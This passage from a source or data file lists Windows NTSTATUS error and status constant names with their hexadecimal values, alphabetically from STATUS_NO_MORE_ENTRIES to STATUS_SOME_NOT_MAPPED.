STATUS_NO_MORE_ENTRIES                                                    NTStatus      = 0x8000001A
STATUS_NO_MORE_FILES                                                      NTStatus      = 0x80000006
STATUS_NO_MORE_MATCHES                                                    NTStatus      = 0xC0000273
STATUS_NO_PAGEFILE                                                        NTStatus      = 0xC0000147
STATUS_NO_PA_DATA                                                         NTStatus      = 0xC00002F8
STATUS_NO_PHYSICALLY_ALIGNED_FREE_SPACE_FOUND                             NTStatus      = 0xC00004A5
STATUS_NO_QUOTAS_FOR_ACCOUNT                                              NTStatus      = 0x0000010D
STATUS_NO_RANGES_PROCESSED                                                NTStatus      = 0xC0000460
STATUS_NO_RECOVERY_POLICY                                                 NTStatus      = 0xC000028D
STATUS_NO_S4U_PROT_SUPPORT                                                NTStatus      = 0xC000040A
STATUS_NO_SAVEPOINT_WITH_OPEN_FILES                                       NTStatus      = 0xC0190048
STATUS_NO_SECRETS                                                         NTStatus      = 0xC0000371
STATUS_NO_SECURITY_CONTEXT                                                NTStatus      = 0xC000042D
STATUS_NO_SECURITY_ON_OBJECT                                              NTStatus      = 0xC00000D7
STATUS_NO_SPOOL_SPACE                                                     NTStatus      = 0xC00000C7
STATUS_NO_SUCH_ALIAS                                                      NTStatus      = 0xC0000151
STATUS_NO_SUCH_DEVICE                                                     NTStatus      = 0xC000000E
STATUS_NO_SUCH_DOMAIN                                                     NTStatus      = 0xC00000DF
STATUS_NO_SUCH_FILE                                                       NTStatus      = 0xC000000F
STATUS_NO_SUCH_GROUP                                                      NTStatus      = 0xC0000066
STATUS_NO_SUCH_LOGON_SESSION                                              NTStatus      = 0xC000005F
STATUS_NO_SUCH_MEMBER                                                     NTStatus      = 0xC000017A
STATUS_NO_SUCH_PACKAGE                                                    NTStatus      = 0xC00000FE
STATUS_NO_SUCH_PRIVILEGE                                                  NTStatus      = 0xC0000060
STATUS_NO_SUCH_USER                                                       NTStatus      = 0xC0000064
STATUS_NO_TGT_REPLY                                                       NTStatus      = 0xC00002EF
STATUS_NO_TOKEN                                                           NTStatus      = 0xC000007C
STATUS_NO_TRACKING_SERVICE                                                NTStatus      = 0xC000029F
STATUS_NO_TRUST_LSA_SECRET                                                NTStatus      = 0xC000018A
STATUS_NO_TRUST_SAM_ACCOUNT                                               NTStatus      = 0xC000018B
STATUS_NO_TXF_METADATA                                                    NTStatus      = 0x80190029
STATUS_NO_UNICODE_TRANSLATION                                             NTStatus      = 0xC0000717
STATUS_NO_USER_KEYS                                                       NTStatus      = 0xC0000290
STATUS_NO_USER_SESSION_KEY                                                NTStatus      = 0xC0000202
STATUS_NO_WORK_DONE                                                       NTStatus      = 0x80000032
STATUS_NO_YIELD_PERFORMED                                                 NTStatus      = 0x40000024
STATUS_NTLM_BLOCKED                                                       NTStatus      = 0xC0000418
STATUS_NT_CROSS_ENCRYPTION_REQUIRED                                       NTStatus      = 0xC000015D
STATUS_NULL_LM_PASSWORD                                                   NTStatus      = 0x4000000D
STATUS_OBJECTID_EXISTS                                                    NTStatus      = 0xC000022B
STATUS_OBJECTID_NOT_FOUND                                                 NTStatus      = 0xC00002F0
STATUS_OBJECT_NAME_COLLISION                                              NTStatus      = 0xC0000035
STATUS_OBJECT_NAME_EXISTS                                                 NTStatus      = 0x40000000
STATUS_OBJECT_NAME_INVALID                                                NTStatus      = 0xC0000033
STATUS_OBJECT_NAME_NOT_FOUND                                              NTStatus      = 0xC0000034
STATUS_OBJECT_NOT_EXTERNALLY_BACKED                                       NTStatus      = 0xC000046D
STATUS_OBJECT_NO_LONGER_EXISTS                                            NTStatus      = 0xC0190021
STATUS_OBJECT_PATH_INVALID                                                NTStatus      = 0xC0000039
STATUS_OBJECT_PATH_NOT_FOUND                                              NTStatus      = 0xC000003A
STATUS_OBJECT_PATH_SYNTAX_BAD                                             NTStatus      = 0xC000003B
STATUS_OBJECT_TYPE_MISMATCH                                               NTStatus      = 0xC0000024
STATUS_OFFLOAD_READ_FILE_NOT_SUPPORTED                                    NTStatus      = 0xC000A2A3
STATUS_OFFLOAD_READ_FLT_NOT_SUPPORTED                                     NTStatus      = 0xC000A2A1
STATUS_OFFLOAD_WRITE_FILE_NOT_SUPPORTED                                   NTStatus      = 0xC000A2A4
STATUS_OFFLOAD_WRITE_FLT_NOT_SUPPORTED                                    NTStatus      = 0xC000A2A2
STATUS_ONLY_IF_CONNECTED                                                  NTStatus      = 0xC00002CC
STATUS_OPEN_FAILED                                                        NTStatus      = 0xC0000136
STATUS_OPERATION_IN_PROGRESS                                              NTStatus      = 0xC0000476
STATUS_OPERATION_NOT_SUPPORTED_IN_TRANSACTION                             NTStatus      = 0xC019005A
STATUS_OPLOCK_BREAK_IN_PROGRESS                                           NTStatus      = 0x00000108
STATUS_OPLOCK_HANDLE_CLOSED                                               NTStatus      = 0x00000216
STATUS_OPLOCK_NOT_GRANTED                                                 NTStatus      = 0xC00000E2
STATUS_OPLOCK_SWITCHED_TO_NEW_HANDLE                                      NTStatus      = 0x00000215
STATUS_ORDINAL_NOT_FOUND                                                  NTStatus      = 0xC0000138
STATUS_ORPHAN_NAME_EXHAUSTED                                              NTStatus      = 0xC000080E
STATUS_PACKAGE_NOT_AVAILABLE                                              NTStatus      = 0xC0000497
STATUS_PACKAGE_UPDATING                                                   NTStatus      = 0xC0000469
STATUS_PAGEFILE_CREATE_FAILED                                             NTStatus      = 0xC0000146
STATUS_PAGEFILE_QUOTA                                                     NTStatus      = 0xC0000007
STATUS_PAGEFILE_QUOTA_EXCEEDED                                            NTStatus      = 0xC000012C
STATUS_PAGE_FAULT_COPY_ON_WRITE                                           NTStatus      = 0x00000112
STATUS_PAGE_FAULT_DEMAND_ZERO                                             NTStatus      = 0x00000111
STATUS_PAGE_FAULT_GUARD_PAGE                                              NTStatus      = 0x00000113
STATUS_PAGE_FAULT_PAGING_FILE                                             NTStatus      = 0x00000114
STATUS_PAGE_FAULT_TRANSITION                                              NTStatus      = 0x00000110
STATUS_PARAMETER_QUOTA_EXCEEDED                                           NTStatus      = 0xC0000410
STATUS_PARITY_ERROR                                                       NTStatus      = 0xC000002B
STATUS_PARTIAL_COPY                                                       NTStatus      = 0x8000000D
STATUS_PARTITION_FAILURE                                                  NTStatus      = 0xC0000172
STATUS_PARTITION_TERMINATING                                              NTStatus      = 0xC00004A0
STATUS_PASSWORD_CHANGE_REQUIRED                                           NTStatus      = 0xC000030C
STATUS_PASSWORD_EXPIRED                                                   NTStatus      = 0xC0000071
STATUS_PASSWORD_MUST_CHANGE                                               NTStatus      = 0xC0000224
STATUS_PASSWORD_RESTRICTION                                               NTStatus      = 0xC000006C
STATUS_PATCH_CONFLICT                                                     NTStatus      = 0xC00004AC
STATUS_PATCH_DEFERRED                                                     NTStatus      = 0x40000037
STATUS_PATH_NOT_COVERED                                                   NTStatus      = 0xC0000257
STATUS_PCP_ATTESTATION_CHALLENGE_NOT_SET                                  NTStatus      = 0xC0292012
STATUS_PCP_AUTHENTICATION_FAILED                                          NTStatus      = 0xC0292008
STATUS_PCP_AUTHENTICATION_IGNORED                                         NTStatus      = 0xC0292009
STATUS_PCP_BUFFER_LENGTH_MISMATCH                                         NTStatus      = 0xC029201E
STATUS_PCP_BUFFER_TOO_SMALL                                               NTStatus      = 0xC0292006
STATUS_PCP_CLAIM_TYPE_NOT_SUPPORTED                                       NTStatus      = 0xC029201C
STATUS_PCP_DEVICE_NOT_FOUND                                               NTStatus      = 0xC029200D
STATUS_PCP_DEVICE_NOT_READY                                               NTStatus      = 0xC0292001
STATUS_PCP_ERROR_MASK                                                     NTStatus      = 0xC0292000
STATUS_PCP_FLAG_NOT_SUPPORTED                                             NTStatus      = 0xC0292004
STATUS_PCP_IFX_RSA_KEY_CREATION_BLOCKED                                   NTStatus      = 0xC029201F
STATUS_PCP_INTERNAL_ERROR                                                 NTStatus      = 0xC0292007
STATUS_PCP_INVALID_HANDLE                                                 NTStatus      = 0xC0292002
STATUS_PCP_INVALID_PARAMETER                                              NTStatus      = 0xC0292003
STATUS_PCP_KEY_ALREADY_FINALIZED                                          NTStatus      = 0xC0292014
STATUS_PCP_KEY_HANDLE_INVALIDATED                                         NTStatus      = 0xC0292022
STATUS_PCP_KEY_NOT_AIK                                                    NTStatus      = 0xC0292019
STATUS_PCP_KEY_NOT_AUTHENTICATED                                          NTStatus      = 0xC0292018
STATUS_PCP_KEY_NOT_FINALIZED                                              NTStatus      = 0xC0292011
STATUS_PCP_KEY_NOT_LOADED                                                 NTStatus      = 0xC029200F
STATUS_PCP_KEY_NOT_SIGNING_KEY                                            NTStatus      = 0xC029201A
STATUS_PCP_KEY_USAGE_POLICY_INVALID                                       NTStatus      = 0xC0292016
STATUS_PCP_KEY_USAGE_POLICY_NOT_SUPPORTED                                 NTStatus      = 0xC0292015
STATUS_PCP_LOCKED_OUT                                                     NTStatus      = 0xC029201B
STATUS_PCP_NOT_PCR_BOUND                                                  NTStatus      = 0xC0292013
STATUS_PCP_NOT_SUPPORTED                                                  NTStatus      = 0xC0292005
STATUS_PCP_NO_KEY_CERTIFICATION                                           NTStatus      = 0xC0292010
STATUS_PCP_POLICY_NOT_FOUND                                               NTStatus      = 0xC029200A
STATUS_PCP_PROFILE_NOT_FOUND                                              NTStatus      = 0xC029200B
STATUS_PCP_RAW_POLICY_NOT_SUPPORTED                                       NTStatus      = 0xC0292021
STATUS_PCP_SOFT_KEY_ERROR                                                 NTStatus      = 0xC0292017
STATUS_PCP_TICKET_MISSING                                                 NTStatus      = 0xC0292020
STATUS_PCP_TPM_VERSION_NOT_SUPPORTED                                      NTStatus      = 0xC029201D
STATUS_PCP_UNSUPPORTED_PSS_SALT                                           NTStatus      = 0x40292023
STATUS_PCP_VALIDATION_FAILED                                              NTStatus      = 0xC029200C
STATUS_PCP_WRONG_PARENT                                                   NTStatus      = 0xC029200E
STATUS_PENDING                                                            NTStatus      = 0x00000103
STATUS_PER_USER_TRUST_QUOTA_EXCEEDED                                      NTStatus      = 0xC0000401
STATUS_PIPE_BROKEN                                                        NTStatus      = 0xC000014B
STATUS_PIPE_BUSY                                                          NTStatus      = 0xC00000AE
STATUS_PIPE_CLOSING                                                       NTStatus      = 0xC00000B1
STATUS_PIPE_CONNECTED                                                     NTStatus      = 0xC00000B2
STATUS_PIPE_DISCONNECTED                                                  NTStatus      = 0xC00000B0
STATUS_PIPE_EMPTY                                                         NTStatus      = 0xC00000D9
STATUS_PIPE_LISTENING                                                     NTStatus      = 0xC00000B3
STATUS_PIPE_NOT_AVAILABLE                                                 NTStatus      = 0xC00000AC
STATUS_PKINIT_CLIENT_FAILURE                                              NTStatus      = 0xC000038C
STATUS_PKINIT_FAILURE                                                     NTStatus      = 0xC0000320
STATUS_PKINIT_NAME_MISMATCH                                               NTStatus      = 0xC00002F9
STATUS_PKU2U_CERT_FAILURE                                                 NTStatus      = 0xC000042F
STATUS_PLATFORM_MANIFEST_BINARY_ID_NOT_FOUND                              NTStatus      = 0xC0EB0005
STATUS_PLATFORM_MANIFEST_CATALOG_NOT_AUTHORIZED                           NTStatus      = 0xC0EB0004
STATUS_PLATFORM_MANIFEST_FILE_NOT_AUTHORIZED                              NTStatus      = 0xC0EB0003
STATUS_PLATFORM_MANIFEST_INVALID                                          NTStatus      = 0xC0EB0002
STATUS_PLATFORM_MANIFEST_NOT_ACTIVE                                       NTStatus      = 0xC0EB0006
STATUS_PLATFORM_MANIFEST_NOT_AUTHORIZED                                   NTStatus      = 0xC0EB0001
STATUS_PLATFORM_MANIFEST_NOT_SIGNED                                       NTStatus      = 0xC0EB0007
STATUS_PLUGPLAY_NO_DEVICE                                                 NTStatus      = 0xC000025E
STATUS_PLUGPLAY_QUERY_VETOED                                              NTStatus      = 0x80000028
STATUS_PNP_BAD_MPS_TABLE                                                  NTStatus      = 0xC0040035
STATUS_PNP_DEVICE_CONFIGURATION_PENDING                                   NTStatus      = 0xC0000495
STATUS_PNP_DRIVER_CONFIGURATION_INCOMPLETE                                NTStatus      = 0xC0000493
STATUS_PNP_DRIVER_CONFIGURATION_NOT_FOUND                                 NTStatus      = 0xC0000492
STATUS_PNP_DRIVER_PACKAGE_NOT_FOUND                                       NTStatus      = 0xC0000491
STATUS_PNP_FUNCTION_DRIVER_REQUIRED                                       NTStatus      = 0xC0000494
STATUS_PNP_INVALID_ID                                                     NTStatus      = 0xC0040038
STATUS_PNP_IRQ_TRANSLATION_FAILED                                         NTStatus      = 0xC0040037
STATUS_PNP_NO_COMPAT_DRIVERS                                              NTStatus      = 0xC0000490
STATUS_PNP_REBOOT_REQUIRED                                                NTStatus      = 0xC00002D2
STATUS_PNP_RESTART_ENUMERATION                                            NTStatus      = 0xC00002CE
STATUS_PNP_TRANSLATION_FAILED                                             NTStatus      = 0xC0040036
STATUS_POLICY_OBJECT_NOT_FOUND                                            NTStatus      = 0xC000029A
STATUS_POLICY_ONLY_IN_DS                                                  NTStatus      = 0xC000029B
STATUS_PORT_ALREADY_HAS_COMPLETION_LIST                                   NTStatus      = 0xC000071A
STATUS_PORT_ALREADY_SET                                                   NTStatus      = 0xC0000048
STATUS_PORT_CLOSED                                                        NTStatus      = 0xC0000700
STATUS_PORT_CONNECTION_REFUSED                                            NTStatus      = 0xC0000041
STATUS_PORT_DISCONNECTED                                                  NTStatus      = 0xC0000037
STATUS_PORT_DO_NOT_DISTURB                                                NTStatus      = 0xC0000036
STATUS_PORT_MESSAGE_TOO_LONG                                              NTStatus      = 0xC000002F
STATUS_PORT_NOT_SET                                                       NTStatus      = 0xC0000353
STATUS_PORT_UNREACHABLE                                                   NTStatus      = 0xC000023F
STATUS_POSSIBLE_DEADLOCK                                                  NTStatus      = 0xC0000194
STATUS_POWER_STATE_INVALID                                                NTStatus      = 0xC00002D3
STATUS_PREDEFINED_HANDLE                                                  NTStatus      = 0x40000016
STATUS_PRENT4_MACHINE_ACCOUNT                                             NTStatus      = 0xC0000357
STATUS_PRIMARY_TRANSPORT_CONNECT_FAILED                                   NTStatus      = 0x0000010E
STATUS_PRINT_CANCELLED                                                    NTStatus      = 0xC00000C8
STATUS_PRINT_QUEUE_FULL                                                   NTStatus      = 0xC00000C6
STATUS_PRIVILEGED_INSTRUCTION                                             NTStatus      = 0xC0000096
STATUS_PRIVILEGE_NOT_HELD                                                 NTStatus      = 0xC0000061
STATUS_PROACTIVE_SCAN_IN_PROGRESS                                         NTStatus      = 0xC000080F
STATUS_PROCEDURE_NOT_FOUND                                                NTStatus      = 0xC000007A
STATUS_PROCESS_CLONED                                                     NTStatus      = 0x00000129
STATUS_PROCESS_IN_JOB                                                     NTStatus      = 0x00000124
STATUS_PROCESS_IS_PROTECTED                                               NTStatus      = 0xC0000712
STATUS_PROCESS_IS_TERMINATING                                             NTStatus      = 0xC000010A
STATUS_PROCESS_NOT_IN_JOB                                                 NTStatus      = 0x00000123
STATUS_PROFILING_AT_LIMIT                                                 NTStatus      = 0xC00000D3
STATUS_PROFILING_NOT_STARTED                                              NTStatus      = 0xC00000B7
STATUS_PROFILING_NOT_STOPPED                                              NTStatus      = 0xC00000B8
STATUS_PROPSET_NOT_FOUND                                                  NTStatus      = 0xC0000230
STATUS_PROTOCOL_NOT_SUPPORTED                                             NTStatus      = 0xC000A013
STATUS_PROTOCOL_UNREACHABLE                                               NTStatus      = 0xC000023E
STATUS_PTE_CHANGED                                                        NTStatus      = 0xC0000434
STATUS_PURGE_FAILED                                                       NTStatus      = 0xC0000435
STATUS_PWD_HISTORY_CONFLICT                                               NTStatus      = 0xC000025C
STATUS_PWD_TOO_LONG                                                       NTStatus      = 0xC000027A
STATUS_PWD_TOO_RECENT                                                     NTStatus      = 0xC000025B
STATUS_PWD_TOO_SHORT                                                      NTStatus      = 0xC000025A
STATUS_QUERY_STORAGE_ERROR                                                NTStatus      = 0x803A0001
STATUS_QUOTA_ACTIVITY                                                     NTStatus      = 0xC000048A
STATUS_QUOTA_EXCEEDED                                                     NTStatus      = 0xC0000044
STATUS_QUOTA_LIST_INCONSISTENT                                            NTStatus      = 0xC0000266
STATUS_QUOTA_NOT_ENABLED                                                  NTStatus      = 0xC00001A9
STATUS_RANGE_LIST_CONFLICT                                                NTStatus      = 0xC0000282
STATUS_RANGE_NOT_FOUND                                                    NTStatus      = 0xC000028C
STATUS_RANGE_NOT_LOCKED                                                   NTStatus      = 0xC000007E
STATUS_RDBSS_CONTINUE_OPERATION                                           NTStatus      = 0xC0410002
STATUS_RDBSS_POST_OPERATION                                               NTStatus      = 0xC0410003
STATUS_RDBSS_RESTART_OPERATION                                            NTStatus      = 0xC0410001
STATUS_RDBSS_RETRY_LOOKUP                                                 NTStatus      = 0xC0410004
STATUS_RDP_PROTOCOL_ERROR                                                 NTStatus      = 0xC00A0032
STATUS_RECEIVE_EXPEDITED                                                  NTStatus      = 0x40000010
STATUS_RECEIVE_PARTIAL                                                    NTStatus      = 0x4000000F
STATUS_RECEIVE_PARTIAL_EXPEDITED                                          NTStatus      = 0x40000011
STATUS_RECOVERY_FAILURE                                                   NTStatus      = 0xC0000227
STATUS_RECOVERY_NOT_NEEDED                                                NTStatus      = 0x40190034
STATUS_RECURSIVE_DISPATCH                                                 NTStatus      = 0xC0000704
STATUS_REDIRECTOR_HAS_OPEN_HANDLES                                        NTStatus      = 0x80000023
STATUS_REDIRECTOR_NOT_STARTED                                             NTStatus      = 0xC00000FB
STATUS_REDIRECTOR_PAUSED                                                  NTStatus      = 0xC00000D1
STATUS_REDIRECTOR_STARTED                                                 NTStatus      = 0xC00000FC
STATUS_REGISTRY_CORRUPT                                                   NTStatus      = 0xC000014C
STATUS_REGISTRY_HIVE_RECOVERED                                            NTStatus      = 0x8000002A
STATUS_REGISTRY_IO_FAILED                                                 NTStatus      = 0xC000014D
STATUS_REGISTRY_QUOTA_LIMIT                                               NTStatus      = 0xC0000256
STATUS_REGISTRY_RECOVERED                                                 NTStatus      = 0x40000009
STATUS_REG_NAT_CONSUMPTION                                                NTStatus      = 0xC00002C9
STATUS_REINITIALIZATION_NEEDED                                            NTStatus      = 0xC0000287
STATUS_REMOTE_DISCONNECT                                                  NTStatus      = 0xC000013C
STATUS_REMOTE_FILE_VERSION_MISMATCH                                       NTStatus      = 0xC019000C
STATUS_REMOTE_NOT_LISTENING                                               NTStatus      = 0xC00000BC
STATUS_REMOTE_RESOURCES                                                   NTStatus      = 0xC000013D
STATUS_REMOTE_SESSION_LIMIT                                               NTStatus      = 0xC0000196
STATUS_REMOTE_STORAGE_MEDIA_ERROR                                         NTStatus      = 0xC000029E
STATUS_REMOTE_STORAGE_NOT_ACTIVE                                          NTStatus      = 0xC000029D
STATUS_REPAIR_NEEDED                                                      NTStatus      = 0xC00001A8
STATUS_REPARSE                                                            NTStatus      = 0x00000104
STATUS_REPARSE_ATTRIBUTE_CONFLICT                                         NTStatus      = 0xC00002B2
STATUS_REPARSE_GLOBAL                                                     NTStatus      = 0x00000368
STATUS_REPARSE_OBJECT                                                     NTStatus      = 0x00000118
STATUS_REPARSE_POINT_ENCOUNTERED                                          NTStatus      = 0xC000050B
STATUS_REPARSE_POINT_NOT_RESOLVED                                         NTStatus      = 0xC0000280
STATUS_REPLY_MESSAGE_MISMATCH                                             NTStatus      = 0xC000021F
STATUS_REQUEST_ABORTED                                                    NTStatus      = 0xC0000240
STATUS_REQUEST_CANCELED                                                   NTStatus      = 0xC0000703
STATUS_REQUEST_NOT_ACCEPTED                                               NTStatus      = 0xC00000D0
STATUS_REQUEST_OUT_OF_SEQUENCE                                            NTStatus      = 0xC000042A
STATUS_REQUEST_PAUSED                                                     NTStatus      = 0xC0000459
STATUS_RESIDENT_FILE_NOT_SUPPORTED                                        NTStatus      = 0xC000047A
STATUS_RESOURCEMANAGER_NOT_FOUND                                          NTStatus      = 0xC019004F
STATUS_RESOURCEMANAGER_READ_ONLY                                          NTStatus      = 0x00000202
STATUS_RESOURCE_DATA_NOT_FOUND                                            NTStatus      = 0xC0000089
STATUS_RESOURCE_ENUM_USER_STOP                                            NTStatus      = 0xC00B0007
STATUS_RESOURCE_IN_USE                                                    NTStatus      = 0xC0000708
STATUS_RESOURCE_LANG_NOT_FOUND                                            NTStatus      = 0xC0000204
STATUS_RESOURCE_NAME_NOT_FOUND                                            NTStatus      = 0xC000008B
STATUS_RESOURCE_NOT_OWNED                                                 NTStatus      = 0xC0000264
STATUS_RESOURCE_REQUIREMENTS_CHANGED                                      NTStatus      = 0x00000119
STATUS_RESOURCE_TYPE_NOT_FOUND                                            NTStatus      = 0xC000008A
STATUS_RESTART_BOOT_APPLICATION                                           NTStatus      = 0xC0000453
STATUS_RESUME_HIBERNATION                                                 NTStatus      = 0x4000002B
STATUS_RETRY                                                              NTStatus      = 0xC000022D
STATUS_REVISION_MISMATCH                                                  NTStatus      = 0xC0000059
STATUS_REVOCATION_OFFLINE_C                                               NTStatus      = 0xC000038B
STATUS_REVOCATION_OFFLINE_KDC                                             NTStatus      = 0xC000040C
STATUS_RING_NEWLY_EMPTY                                                   NTStatus      = 0x00000213
STATUS_RING_PREVIOUSLY_ABOVE_QUOTA                                        NTStatus      = 0x00000212
STATUS_RING_PREVIOUSLY_EMPTY                                              NTStatus      = 0x00000210
STATUS_RING_PREVIOUSLY_FULL                                               NTStatus      = 0x00000211
STATUS_RING_SIGNAL_OPPOSITE_ENDPOINT                                      NTStatus      = 0x00000214
STATUS_RKF_ACTIVE_KEY                                                     NTStatus      = 0xC0400006
STATUS_RKF_BLOB_FULL                                                      NTStatus      = 0xC0400003
STATUS_RKF_DUPLICATE_KEY                                                  NTStatus      = 0xC0400002
STATUS_RKF_FILE_BLOCKED                                                   NTStatus      = 0xC0400005
STATUS_RKF_KEY_NOT_FOUND                                                  NTStatus      = 0xC0400001
STATUS_RKF_STORE_FULL                                                     NTStatus      = 0xC0400004
STATUS_RM_ALREADY_STARTED                                                 NTStatus      = 0x40190035
STATUS_RM_CANNOT_BE_FROZEN_FOR_SNAPSHOT                                   NTStatus      = 0xC019005D
STATUS_RM_DISCONNECTED                                                    NTStatus      = 0xC0190032
STATUS_RM_METADATA_CORRUPT                                                NTStatus      = 0xC0190006
STATUS_RM_NOT_ACTIVE                                                      NTStatus      = 0xC0190005
STATUS_ROLLBACK_TIMER_EXPIRED                                             NTStatus      = 0xC019003C
STATUS_RTPM_CONTEXT_COMPLETE                                              NTStatus      = 0x00293001
STATUS_RTPM_CONTEXT_CONTINUE                                              NTStatus      = 0x00293000
STATUS_RTPM_INVALID_CONTEXT                                               NTStatus      = 0xC0293004
STATUS_RTPM_NO_RESULT                                                     NTStatus      = 0xC0293002
STATUS_RTPM_PCR_READ_INCOMPLETE                                           NTStatus      = 0xC0293003
STATUS_RTPM_UNSUPPORTED_CMD                                               NTStatus      = 0xC0293005
STATUS_RUNLEVEL_SWITCH_AGENT_TIMEOUT                                      NTStatus      = 0xC000A145
STATUS_RUNLEVEL_SWITCH_IN_PROGRESS                                        NTStatus      = 0xC000A146
STATUS_RUNLEVEL_SWITCH_TIMEOUT                                            NTStatus      = 0xC000A143
STATUS_RWRAW_ENCRYPTED_FILE_NOT_ENCRYPTED                                 NTStatus      = 0xC00004A7
STATUS_RWRAW_ENCRYPTED_INVALID_EDATAINFO_FILEOFFSET                       NTStatus      = 0xC00004A8
STATUS_RWRAW_ENCRYPTED_INVALID_EDATAINFO_FILERANGE                        NTStatus      = 0xC00004A9
STATUS_RWRAW_ENCRYPTED_INVALID_EDATAINFO_PARAMETER                        NTStatus      = 0xC00004AA
STATUS_RXACT_COMMITTED                                                    NTStatus      = 0x0000010A
STATUS_RXACT_COMMIT_FAILURE                                               NTStatus      = 0xC000011D
STATUS_RXACT_COMMIT_NECESSARY                                             NTStatus      = 0x80000018
STATUS_RXACT_INVALID_STATE                                                NTStatus      = 0xC000011C
STATUS_RXACT_STATE_CREATED                                                NTStatus      = 0x40000004
STATUS_SAM_INIT_FAILURE                                                   NTStatus      = 0xC00002E3
STATUS_SAM_NEED_BOOTKEY_FLOPPY                                            NTStatus      = 0xC00002E0
STATUS_SAM_NEED_BOOTKEY_PASSWORD                                          NTStatus      = 0xC00002DF
STATUS_SCRUB_DATA_DISABLED                                                NTStatus      = 0xC0000478
STATUS_SECCORE_INVALID_COMMAND                                            NTStatus      = 0xC0E80000
STATUS_SECONDARY_IC_PROVIDER_NOT_REGISTERED                               NTStatus      = 0xC000A121
STATUS_SECRET_TOO_LONG                                                    NTStatus      = 0xC0000157
STATUS_SECTION_NOT_EXTENDED                                               NTStatus      = 0xC0000087
STATUS_SECTION_NOT_IMAGE                                                  NTStatus      = 0xC0000049
STATUS_SECTION_PROTECTION                                                 NTStatus      = 0xC000004E
STATUS_SECTION_TOO_BIG                                                    NTStatus      = 0xC0000040
STATUS_SECUREBOOT_FILE_REPLACED                                           NTStatus      = 0xC0430007
STATUS_SECUREBOOT_INVALID_POLICY                                          NTStatus      = 0xC0430003
STATUS_SECUREBOOT_NOT_BASE_POLICY                                         NTStatus      = 0xC043000F
STATUS_SECUREBOOT_NOT_ENABLED                                             NTStatus      = 0x80430006
STATUS_SECUREBOOT_NOT_SUPPLEMENTAL_POLICY                                 NTStatus      = 0xC0430010
STATUS_SECUREBOOT_PLATFORM_ID_MISMATCH                                    NTStatus      = 0xC043000B
STATUS_SECUREBOOT_POLICY_MISSING_ANTIROLLBACKVERSION                      NTStatus      = 0xC043000A
STATUS_SECUREBOOT_POLICY_NOT_AUTHORIZED                                   NTStatus      = 0xC0430008
STATUS_SECUREBOOT_POLICY_NOT_SIGNED                                       NTStatus      = 0xC0430005
STATUS_SECUREBOOT_POLICY_PUBLISHER_NOT_FOUND                              NTStatus      = 0xC0430004
STATUS_SECUREBOOT_POLICY_ROLLBACK_DETECTED                                NTStatus      = 0xC043000C
STATUS_SECUREBOOT_POLICY_UNKNOWN                                          NTStatus      = 0xC0430009
STATUS_SECUREBOOT_POLICY_UPGRADE_MISMATCH                                 NTStatus      = 0xC043000D
STATUS_SECUREBOOT_POLICY_VIOLATION                                        NTStatus      = 0xC0430002
STATUS_SECUREBOOT_REQUIRED_POLICY_FILE_MISSING                            NTStatus      = 0xC043000E
STATUS_SECUREBOOT_ROLLBACK_DETECTED                                       NTStatus      = 0xC0430001
STATUS_SECURITY_STREAM_IS_INCONSISTENT                                    NTStatus      = 0xC00001A0
STATUS_SEGMENT_NOTIFICATION                                               NTStatus      = 0x40000005
STATUS_SEMAPHORE_LIMIT_EXCEEDED                                           NTStatus      = 0xC0000047
STATUS_SERIAL_COUNTER_TIMEOUT                                             NTStatus      = 0x4000000C
STATUS_SERIAL_MORE_WRITES                                                 NTStatus      = 0x40000008
STATUS_SERIAL_NO_DEVICE_INITED                                            NTStatus      = 0xC0000150
STATUS_SERVER_DISABLED                                                    NTStatus      = 0xC0000080
STATUS_SERVER_HAS_OPEN_HANDLES                                            NTStatus      = 0x80000024
STATUS_SERVER_NOT_DISABLED                                                NTStatus      = 0xC0000081
STATUS_SERVER_SHUTDOWN_IN_PROGRESS                                        NTStatus      = 0xC00002FF
STATUS_SERVER_SID_MISMATCH                                                NTStatus      = 0xC00002A0
STATUS_SERVER_UNAVAILABLE                                                 NTStatus      = 0xC0000466
STATUS_SERVICES_FAILED_AUTOSTART                                          NTStatus      = 0x4000A144
STATUS_SERVICE_NOTIFICATION                                               NTStatus      = 0x40000018
STATUS_SETMARK_DETECTED                                                   NTStatus      = 0x80000021
STATUS_SET_CONTEXT_DENIED                                                 NTStatus      = 0xC000060A
STATUS_SHARED_IRQ_BUSY                                                    NTStatus      = 0xC000016C
STATUS_SHARED_POLICY                                                      NTStatus      = 0xC0000299
STATUS_SHARE_UNAVAILABLE                                                  NTStatus      = 0xC0000480
STATUS_SHARING_PAUSED                                                     NTStatus      = 0xC00000CF
STATUS_SHARING_VIOLATION                                                  NTStatus      = 0xC0000043
STATUS_SHORT_NAMES_NOT_ENABLED_ON_VOLUME                                  NTStatus      = 0xC000019F
STATUS_SHUTDOWN_IN_PROGRESS                                               NTStatus      = 0xC00002FE
STATUS_SINGLE_STEP                                                        NTStatus      = 0x80000004
STATUS_SMARTCARD_CARD_BLOCKED                                             NTStatus      = 0xC0000381
STATUS_SMARTCARD_CARD_NOT_AUTHENTICATED                                   NTStatus      = 0xC0000382
STATUS_SMARTCARD_CERT_EXPIRED                                             NTStatus      = 0xC000038D
STATUS_SMARTCARD_CERT_REVOKED                                             NTStatus      = 0xC0000389
STATUS_SMARTCARD_IO_ERROR                                                 NTStatus      = 0xC0000387
STATUS_SMARTCARD_LOGON_REQUIRED                                           NTStatus      = 0xC00002FA
STATUS_SMARTCARD_NO_CARD                                                  NTStatus      = 0xC0000383
STATUS_SMARTCARD_NO_CERTIFICATE                                           NTStatus      = 0xC0000385
STATUS_SMARTCARD_NO_KEYSET                                                NTStatus      = 0xC0000386
STATUS_SMARTCARD_NO_KEY_CONTAINER                                         NTStatus      = 0xC0000384
STATUS_SMARTCARD_SILENT_CONTEXT                                           NTStatus      = 0xC000038F
STATUS_SMARTCARD_SUBSYSTEM_FAILURE                                        NTStatus      = 0xC0000321
STATUS_SMARTCARD_WRONG_PIN                                                NTStatus      = 0xC0000380
STATUS_SMB1_NOT_AVAILABLE                                                 NTStatus      = 0xC0000513
STATUS_SMB_BAD_CLUSTER_DIALECT                                            NTStatus      = 0xC05D0001
STATUS_SMB_GUEST_LOGON_BLOCKED                                            NTStatus      = 0xC05D0002
STATUS_SMB_NO_PREAUTH_INTEGRITY_HASH_OVERLAP                              NTStatus      = 0xC05D0000
STATUS_SMI_PRIMITIVE_INSTALLER_FAILED                                     NTStatus      = 0xC0150025
STATUS_SMR_GARBAGE_COLLECTION_REQUIRED                                    NTStatus      = 0xC0000514
STATUS_SOME_NOT_MAPPED                                                    NTStatus      = 0x00000107
